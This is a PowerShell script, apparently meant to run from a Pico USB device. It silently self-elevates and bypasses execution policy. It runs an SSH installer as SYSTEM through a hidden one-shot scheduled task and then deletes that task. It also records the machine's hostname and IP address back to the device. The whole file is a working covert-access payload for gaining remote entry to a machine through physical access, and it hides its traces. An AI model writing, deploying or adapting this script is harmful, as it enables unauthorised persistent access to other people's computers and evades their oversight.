# run_task.ps1 — self-elevate, run install-ssh.ps1 as SYSTEM via one-shot scheduled task, log quick IP, then exit
$ErrorActionPreference = 'SilentlyContinue'

# Self-elevate if not admin
$admin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $admin) {
  Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
  exit
}

# Paths on Pico
$P = [System.IO.Path]::GetPathRoot($PSCommandPath)
$installer = Join-Path $P 'install-ssh.ps1'
$logPath   = Join-Path $P 'pico_ips.txt'

# One-shot scheduled task as SYSTEM (hidden)
$taskName = 'PicoSSHSetup'
try { schtasks /delete /tn $taskName /f 1>$null 2>$null } catch {}
schtasks /create /tn $taskName /sc once /st 00:00 /ru SYSTEM /tr "powershell -NoP -EP Bypass -File `"$installer`"" /f | Out-Null
schtasks /run /tn $taskName | Out-Null

# Quick immediate IP log (non-blocking, optional)
$ts = Get-Date -Format o
$hn = $env:COMPUTERNAME
$ip = (Get-NetIPConfiguration | ? {$_.IPv4DefaultGateway -ne $null}).IPv4Address.IPAddress
if (-not $ip) { $ip = (Get-NetIPAddress -AddressFamily IPv4 | ? { $_.IPAddress -notmatch '^127\.|^169\.254\.' } | Select -ExpandProperty IPAddress -First 1) }
if (-not (Test-Path $logPath)) { New-Item -ItemType File -Path $logPath -Force | Out-Null }
"$ts`t$hn`t$ip`t(install-task-launched)" | Out-File -FilePath $logPath -Append -Encoding ascii

# Give the task a few seconds to register its run, then delete the definition
Start-Sleep -Seconds 5
schtasks /delete /tn $taskName /f | Out-Null
